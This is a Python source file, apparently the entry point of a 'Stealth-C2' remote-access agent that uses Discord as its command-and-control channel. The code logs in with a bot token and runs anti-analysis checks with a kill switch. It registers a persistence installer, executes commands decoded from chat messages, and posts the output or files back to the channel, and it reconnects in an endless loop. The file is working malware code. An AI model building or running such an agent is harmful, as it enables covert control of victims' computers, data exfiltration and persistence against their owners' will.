"""
Stealth-C2 — Agent Entry Point
Connects to Discord, runs OpSec checks, and dispatches commands.
"""

import discord
import os
import asyncio
import opsec
from dotenv import load_dotenv
import decoder
import commands
import persistence

commands.EXEC_REGISTRY["cmd_persist"] = persistence.install_persistence

load_dotenv()
TOKEN = os.getenv("DISCORD_TOKEN")

intents = discord.Intents.default()
intents.message_content = True
client = discord.Client(intents=intents)


@client.event
async def on_ready():
    if opsec.is_compromised():
        opsec.engage_kill_switch()
    print(f"[+] Online as {client.user} | OpSec: PASS")


@client.event
async def on_message(message):
    if message.author == client.user:
        return

    intent = decoder.extract_intent(message.content)
    if not intent:
        return

    cmd_id, args = intent
    handler = commands.EXEC_REGISTRY.get(cmd_id)
    if not handler:
        return

    try:
        if cmd_id == "cmd_exit":
            await message.channel.send("🛑 Agent shutting down.")
            await client.close()
            handler(args)
            return

        result = handler(args)

        if isinstance(result, discord.File):
            await message.channel.send(file=result)
        else:
            await message.channel.send(f"```\n{result}\n```")

    except Exception as e:
        await message.channel.send(f"⚠️ Error: {e}")


if __name__ == "__main__":
    if not TOKEN:
        print("[-] Error: DISCORD_TOKEN missing from .env")
    else:
        while True:
            try:
                client.run(TOKEN)
            except Exception:
                import time
                time.sleep(5)